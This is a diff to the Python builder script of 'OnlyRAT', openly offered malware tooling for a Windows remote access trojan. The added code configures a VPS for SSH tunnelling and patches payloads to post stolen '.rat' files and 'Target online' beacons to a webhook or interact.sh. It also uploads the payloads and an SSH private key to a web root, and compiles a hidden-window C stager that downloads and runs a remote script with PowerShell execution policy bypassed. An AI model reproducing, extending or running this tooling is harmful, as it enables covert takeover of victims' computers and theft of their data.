@@ -1,17 +1,37 @@
 import os
 import sys
 import subprocess
+import time
+import getpass
+
+try:
+    import paramiko
+except ImportError:
+    print("[!] Error: 'paramiko' is required for VPS automation.")
+    print("    Install it with: sudo apt install python3-paramiko")
+    sys.exit(1)
+
+def log(message, level="INFO"):
+    colors = {
+        "INFO": "\033[94m[*]\033[0m",
+        "SUCCESS": "\033[92m[+]\033[0m",
+        "WARNING": "\033[93m[!]\033[0m",
+        "ERROR": "\033[91m[!!]\033[0m",
+        "LIVE": "\033[96m[LIVE]\033[0m"
+    }
+    timestamp = time.strftime("%H:%M:%S")
+    print(f"{colors.get(level, '[*]')} {timestamp} - {message}")
 
 def get_input(prompt, default=""):
     try:
-        val = input(f"{prompt} [{default}]: ").strip()
+        val = input(f"\033[95m[?]\033[0m {prompt} [{default}]: ").strip()
         return val if val else default
     except EOFError:
         return default
 
 def patch_file(filepath, replacements):
     if not os.path.exists(filepath):
-        print(f"[!] Warning: {filepath} not found.")
+        log(f"File {filepath} not found.", "WARNING")
         return
 
     with open(filepath, 'r') as f:
@@ -22,36 +42,81 @@ def patch_file(filepath, replacements):
 
     with open(filepath, 'w') as f:
         f.write(content)
-    print(f"[+] Patched {filepath}")
+    log(f"Patched {filepath}", "SUCCESS")
+
+def run_vps_commands(client, commands):
+    for cmd in commands:
+        log(f"Executing: {cmd}", "LIVE")
+        stdin, stdout, stderr = client.exec_command(cmd)
+        exit_status = stdout.channel.recv_exit_status()
+        if exit_status != 0:
+            err = stderr.read().decode().strip()
+            log(f"Command failed: {cmd}\nError: {err}", "ERROR")
+        else:
+            log(f"Success: {cmd}", "SUCCESS")
 
 def main():
-    print("==============================")
-    print("   OnlyRAT Advanced Builder   ")
-    print("==============================")
-    print("This script configures payloads and compiles a Windows EXE stager.\n")
+    print("\033[1m\033[94m")
+    print("====================================")
+    print("   OnlyRAT Advanced Builder v2.0    ")
+    print("====================================")
+    print("\033[0m")
+    log("Initializing advanced configuration and VPS automation engine...")
 
     base_dir = "."
-
     mode = get_input("Connection Mode (local/vps)", "vps").lower()
-
     exfil_method = get_input("Exfiltration Method (webhook/interactsh)", "webhook").lower()
     exfil_url = get_input("Enter Webhook URL or interact.sh link", "https://interact.sh/...")
 
     if mode == "vps":
         vps_ip = get_input("VPS IP Address", "1.2.3.4")
         vps_user = get_input("VPS Username", "root")
-        vps_port = get_input("VPS SSH Port", "22")
+        vps_port = int(get_input("VPS SSH Port", "22"))
+        vps_password = getpass.getpass("\033[95m[?]\033[0m Enter VPS Password: ")
         vps_forward_port = get_input("VPS Forwarded Port (for RAT connection)", "2583")
 
-        # Patch from-vps.cmd
+        # 1. Connect to VPS
+        log(f"Connecting to VPS at {vps_ip}...")
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            ssh.connect(vps_ip, port=vps_port, username=vps_user, password=vps_password)
+            log("Connected to VPS.", "SUCCESS")
+        except Exception as e:
+            log(f"Connection failed: {e}", "ERROR")
+            sys.exit(1)
+
+        # 2. Check if port is in use
+        log(f"Checking if port {vps_forward_port} is available...")
+        stdin, stdout, stderr = ssh.exec_command(f"netstat -tuln | grep :{vps_forward_port}")
+        if stdout.read():
+            log(f"Port {vps_forward_port} is ALREADY IN USE on the VPS!", "WARNING")
+            if get_input("Continue anyway? (y/n)", "n").lower() != 'y':
+                ssh.close()
+                sys.exit(1)
+        else:
+            log(f"Port {vps_forward_port} is free.", "SUCCESS")
+
+        # 3. Configure VPS SSH for Forwarding
+        log("Configuring VPS SSH (AllowTcpForwarding, GatewayPorts)...")
+        vps_setup_commands = [
+            "sed -i 's/^#AllowTcpForwarding.*/AllowTcpForwarding yes/' /etc/ssh/sshd_config",
+            "sed -i 's/^AllowTcpForwarding.*/AllowTcpForwarding yes/' /etc/ssh/sshd_config",
+            "sed -i 's/^#GatewayPorts.*/GatewayPorts yes/' /etc/ssh/sshd_config",
+            "sed -i 's/^GatewayPorts.*/GatewayPorts yes/' /etc/ssh/sshd_config",
+            "service ssh restart || systemctl restart ssh"
+        ]
+        run_vps_commands(ssh, vps_setup_commands)
+
+        # 4. Patch Files
+        log("Patching local payloads with VPS configuration...")
         patch_file(f"{base_dir}/installers/from-vps.cmd", {
             'set "EcSjRhAguo=X.X.X.X"': f'set "EcSjRhAguo={vps_ip}"'
         })
-        # Patch payloads/v1.cmd
         patch_file(f"{base_dir}/payloads/v1.cmd", {
             'set "EcSjRhAguo=X.X.X.X"': f'set "EcSjRhAguo={vps_ip}"'
         })
-        # Patch payloads/v2.ps1
+
         replacements = {
             '$nkowFESgaO = "USERNAME"': f'$nkowFESgaO = "{vps_user}"',
             '$ecPlmJVLRo = "X.X.X.X"': f'$ecPlmJVLRo = "{vps_ip}"',
@@ -59,56 +124,70 @@ def main():
             '$YlEQgBmePn = "2583"': f'$YlEQgBmePn = "{vps_forward_port}"'
         }
 
-        # Adding interact.sh support to v2.ps1 exfiltration
         if exfil_method == "interactsh":
-            # Original: scp -P $ENyMAhIrsb -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
-            # We add a curl exfil as well.
+            status_update = f'Invoke-RestMethod -Uri "{exfil_url}" -Method Post -Body "Target online: $env:COMPUTERNAME"'
+            replacements['Start-Service sshd'] = f'Start-Service sshd; {status_update}'
             replacements['Remove-Item $CRYnrkaDbe'] = f'Invoke-RestMethod -Uri "{exfil_url}" -Method Post -InFile $CRYnrkaDbe; Remove-Item $CRYnrkaDbe'
+        else:
+            status_update = f'curl.exe -F "content=Target online: $env:COMPUTERNAME" {exfil_url}'
+            replacements['Start-Service sshd'] = f'Start-Service sshd; {status_update}'
+            # Discord webhook for the .rat file
+            replacements['Remove-Item $CRYnrkaDbe'] = f'curl.exe -F "file=@$CRYnrkaDbe" {exfil_url}; Remove-Item $CRYnrkaDbe'
 
         patch_file(f"{base_dir}/payloads/v2.ps1", replacements)
 
+        # 5. Upload Payloads to VPS
+        log("Uploading payloads to VPS web root (assuming /var/www/html/onlyrat)...")
+        ssh.exec_command("mkdir -p /var/www/html/onlyrat/payloads")
+        sftp = ssh.open_sftp()
+        for filename in os.listdir(f"{base_dir}/payloads"):
+            local_path = os.path.join(f"{base_dir}/payloads", filename)
+            if os.path.isfile(local_path):
+                remote_path = f"/var/www/html/onlyrat/payloads/{filename}"
+                log(f"Uploading {filename} to {remote_path}...", "LIVE")
+                sftp.put(local_path, remote_path)
+
+        # Also upload key (needed by v2.ps1)
+        log("Uploading public key to VPS web root...", "LIVE")
+        sftp.put(f"{base_dir}/key.pub", "/var/www/html/onlyrat/key.pub")
+        sftp.put(f"{base_dir}/key", "/var/www/html/onlyrat/key")
+
+        sftp.close()
+        ssh.close()
+        log("VPS deployment complete.", "SUCCESS")
+
     else:
-        # Local mode
+        # Local Mode
+        log("Configuring for Local (GitHub) mode...")
         patch_file(f"{base_dir}/installers/from-github.cmd", {
             "DISCORDWEBHOOK": exfil_url
         })
 
-        # Patch g2.ps1 for interact.sh or custom webhook
+        g2_replacements = {}
         if exfil_method == "interactsh":
-             patch_file(f"{base_dir}/payloads/g2.ps1", {
-                'curl.exe -F "payload_json={\\\"username\\\": \\\"onlyrat\\\", \\\"content\\\": \\\"download me\\\"}" -F "file=@$env:username.rat" $PEBgxuJUfd': f'curl.exe -X POST -T "$env:username.rat" {exfil_url}'
-             })
+             g2_replacements['curl.exe -F "payload_json={\\\"username\\\": \\\"onlyrat\\\", \\\"content\\\": \\\"download me\\\"}" -F "file=@$env:username.rat" $PEBgxuJUfd'] = f'curl.exe -X POST -T "$env:username.rat" {exfil_url}'
+             g2_replacements['Start-Service sshd'] = f'Start-Service sshd; Invoke-RestMethod -Uri "{exfil_url}" -Method Post -Body "Local Target online: $env:COMPUTERNAME"'
         else:
-             # If it's a generic webhook that isn't Discord, it might fail with original Discord flags
-             # But we'll leave it as is unless specified.
-             pass
+             g2_replacements['Start-Service sshd'] = f'Start-Service sshd; curl.exe -F "content=Local Target online: $env:COMPUTERNAME" {exfil_url}'
 
-    print("\n[+] Payloads configured successfully.")
+        patch_file(f"{base_dir}/payloads/g2.ps1", g2_replacements)
 
+    # 6. Compilation
     compile_exe = get_input("Do you want to compile an EXE stager? (y/n)", "y").lower()
     if compile_exe == "y":
-        target_url = ""
-        if mode == "vps":
-            # For VPS mode, the stager should download the v1.cmd from the VPS
-            target_url = f"http://{vps_ip}/v1.cmd"
-        else:
-            # For Local mode, it downloads from Github
-            target_url = "https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd"
-
+        target_url = f"http://{vps_ip}/onlyrat/payloads/v1.cmd" if mode == "vps" else "https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd"
         stager_url = get_input("Confirm Stager Download URL", target_url)
 
+        log(f"Generating C stager source for {stager_url}...")
         c_code = f"""
 #include <windows.h>
 #include <stdio.h>
 
 int main() {{
-    // Hide console window
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
-
     char cmd[512];
     snprintf(cmd, sizeof(cmd), "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"$url='{stager_url}'; $file='%TEMP%\\\\stager.cmd'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process $file -WindowStyle Hidden\\\"");
-
     system(cmd);
     return 0;
 }}
@@ -116,18 +195,16 @@ int main() {{
         with open("stager.c", "w") as f:
             f.write(c_code)
 
-        print("[*] Compiling stager.exe using x86_64-w64-mingw32-gcc...")
+        log("Compiling stager.exe using x86_64-w64-mingw32-gcc...", "LIVE")
         try:
             subprocess.run(["x86_64-w64-mingw32-gcc", "stager.c", "-o", "stager.exe", "-mwindows"], check=True)
-            print("[+] stager.exe created successfully!")
+            log("stager.exe created successfully!", "SUCCESS")
         except Exception as e:
-            print(f"[!] Compilation failed: {e}")
-            print("[!] Ensure mingw-w64 is installed: sudo apt install mingw-w64")
+            log(f"Compilation failed: {e}", "ERROR")
 
-    print("\n[***] All done! [***]")
-    if mode == "vps":
-        print(f"Next steps: Upload the contents of {base_dir}/payloads/ to your VPS web root.")
-    print("Deploy stager.exe or the .cmd files in installers/ to your target.")
+    print("\n\033[1m\033[92m[***] BUILD COMPLETE [***]\033[0m")
+    log("All systems configured and payloads deployed.")
+    log("Ensure your VPS web server (Apache/Nginx) is running and serves /var/www/html/onlyrat/")
 
 if __name__ == "__main__":
     main()
